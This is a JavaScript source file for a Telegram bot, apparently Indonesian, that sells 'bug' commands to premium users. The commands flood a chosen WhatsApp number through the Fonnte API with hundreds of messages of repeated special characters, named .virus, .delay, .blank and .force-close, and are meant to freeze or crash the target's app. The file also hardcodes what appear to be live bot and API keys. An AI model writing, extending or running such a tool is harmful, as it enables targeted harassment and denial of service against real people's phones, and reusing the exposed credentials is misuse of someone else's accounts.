// bugrub_fix2.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

// ===== KONFIGURASI =====
const TELEGRAM_TOKEN = '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY = 'cLREhDbXmk9me7b9hSQJ';
const OWNER_ID = '7894053417';

if (!TELEGRAM_TOKEN || !FONNTE_KEY || !OWNER_ID) {
  console.error('❌ Harap set TELEGRAM_TOKEN, FONNTE_KEY & OWNER_ID');
  process.exit(1);
}

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const make20 = txt => Array.from({ length: 20 }).map(() => txt).join('\n');

// ===== FILE PREMIUM =====
const PREMIUM_FILE = './premium.json';
if (!fs.existsSync(PREMIUM_FILE)) fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
const getPremium = () => JSON.parse(fs.readFileSync(PREMIUM_FILE));
const savePremium = arr => fs.writeFileSync(PREMIUM_FILE, JSON.stringify(arr, null, 2));

// ===== HELPER: KIRIM SPAM =====
async function kirimSpam(target, isi, chatId, label = '', repeat = 5, delayMs = 1000) {
  if (!target) return bot.sendMessage(chatId, `Format: ${label} &lt;nomor&gt;`, { parse_mode: 'HTML' });

  const payload = make20(isi);
  const statusMsg = await bot.sendMessage(chatId, `🩸 Mengirim ${label} ke <b>${target}</b>...`, { parse_mode: 'HTML' });

  let sukses = 0, gagal = 0;

  for (let i = 1; i <= repeat; i++) {
    try {
      const res = await axios.post(
        'https://api.fonnte.com/send',
        { target: target.trim(), message: payload },
        { headers: { Authorization: FONNTE_KEY }, timeout: 10000 }
      );
      if (res.data && res.data.status === true) sukses++;
      else gagal++;
    } catch (err) {
      console.error('Axios error:', err.message);
      gagal++;
    }

    const bar = '▰'.repeat(Math.floor((i / repeat) * 10)) + '▱'.repeat(10 - Math.floor((i / repeat) * 10));
    await bot.editMessageText(
      `📤 <b>Progress ${i}/${repeat}</b>\n${bar}\n✅ Sukses: ${sukses}\n❌ Gagal: ${gagal}`,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'HTML' }
    );

    await sleep(delayMs);
  }

  if (fs.existsSync('./mani.jpg')) {
    const caption = `✅ <b>SUCCESS</b> send <b>${target}</b> <b>${label}</b> <b>lemah cik!</b>`;
    await bot.sendChatAction(chatId, 'upload_photo');
    await bot.sendPhoto(chatId, fs.readFileSync('./mani.jpg'), { caption, parse_mode: 'HTML' });
  } else {
    await bot.sendMessage(chatId, `✅ SUCCESS send <b>${target}</b> <b>${label}</b> <b>lemah cik!</b>`, { parse_mode: 'HTML' });
  }
}

// ===== EVENT PESAN =====
bot.on('message', async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = (msg.text || '').trim();

  try {
    // ===== OWNER ADD PREMIUM =====
    if (text.startsWith('.add')) {
      if (String(userId) !== String(OWNER_ID))
        return bot.sendMessage(chatId, '❌ Lu bukan owner bro.', { parse_mode: 'HTML' });

      const parts = text.split(/\s+/);
      const target = parts[1];
      if (!target) return bot.sendMessage(chatId, 'Format: .add &lt;user_id&gt;', { parse_mode: 'HTML' });

      const list = getPremium();
      if (!list.includes(target)) {
        list.push(target);
        savePremium(list);
        await bot.sendMessage(chatId, `✅ SUCCES ADD NAMA ${target}`, { parse_mode: 'HTML' });
      } else {
        await bot.sendMessage(chatId, '⚠️ User udah ada di list premium.', { parse_mode: 'HTML' });
      }
      return;
    }

    // ===== CEK PREMIUM =====
    const premiumList = getPremium();
    if (String(userId) !== String(OWNER_ID) && !premiumList.includes(String(userId))) {
      if (text.startsWith('.') && !text.startsWith('.add')) {
        return bot.sendMessage(chatId, '<b>LU BUKAN PREMIUM TOLOL</b>', { parse_mode: 'HTML' });
      }
    }

    // ===== MENU =====
    if (text === '.menu') {
      if (!fs.existsSync('./nina.jpg'))
        return bot.sendMessage(chatId, '❌ Foto nina.jpg tidak ditemukan!', { parse_mode: 'HTML' });

      const caption = `こんにちは、私は<b>rifat</b>によって作られたボット <b>lawliet bot</b> です\n\n<b>Dev:</b> @RIFATZoir\n<b>Name bot:</b> lawliet bot\n<b>Version:</b> v2\n
いらっしゃいませ`;

      const opts = {
        caption,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: '📜 MENU BUG', callback_data: 'menu_bot' }]
          ]
        }
      };

      await bot.sendChatAction(chatId, 'upload_photo');
      await bot.sendPhoto(chatId, fs.readFileSync('./nina.jpg'), opts);
      return;
    }

    // ===== COMMANDS =====
    if (text.startsWith('.virus')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      const isi = parts.slice(2).join(' ') || 'ꦾ '.repeat(500);
      await kirimSpam(target, isi, chatId, '.virus', 300, 30);
      return;
    }

    if (text.startsWith('.delay')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      const isi = parts.slice(2).join(' ') || 'ꦽ'.repeat(500);
      await kirimSpam(target, isi, chatId, '.delay', 444, 10);
      return;
    }

    if (text.startsWith('.blank')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      const isi = '꧅꧅'.repeat(400);
      await kirimSpam(target, isi, chatId, '.blank', 490, 10);
      return;
    }

    if (text.startsWith('.force-close')) {
      const parts = text.split(/\s+/);
      const target = parts[1];
      const isi = 'ꦾ༒꩞'.repeat(300);
      await kirimSpam(target, isi, chatId, '.force-close', 5, 9);
      return;
    }

  } catch (err) {
    console.error('Error:', err.message);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${err.message}`, { parse_mode: 'HTML' });
  }
});

// ===== CALLBACK MENU =====
bot.on('callback_query', async query => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'menu_bot') {
    if (!fs.existsSync('./mama.jpg'))
      return bot.sendMessage(chatId, '❌ Foto mama.jpg tidak ditemukan!', { parse_mode: 'HTML' });

    const caption = `これを入力してください賢く使ってください
<b>MENU</b>
______________________
<b>.virus</b> 62×××××
<b>.delay</b> 62×××××
<b>.blank</b> 62×××××
<b>.force-close</b> 62×××××
______________________
誤用しないでください。!`;

    const opts = { caption, parse_mode: 'HTML' };

    await bot.sendChatAction(chatId, 'upload_photo');
    await bot.sendPhoto(chatId, fs.readFileSync('./mama.jpg'), opts);
    await bot.answerCallbackQuery(query.id, { text: '📋 Menampilkan menu bot...' });
  }
});
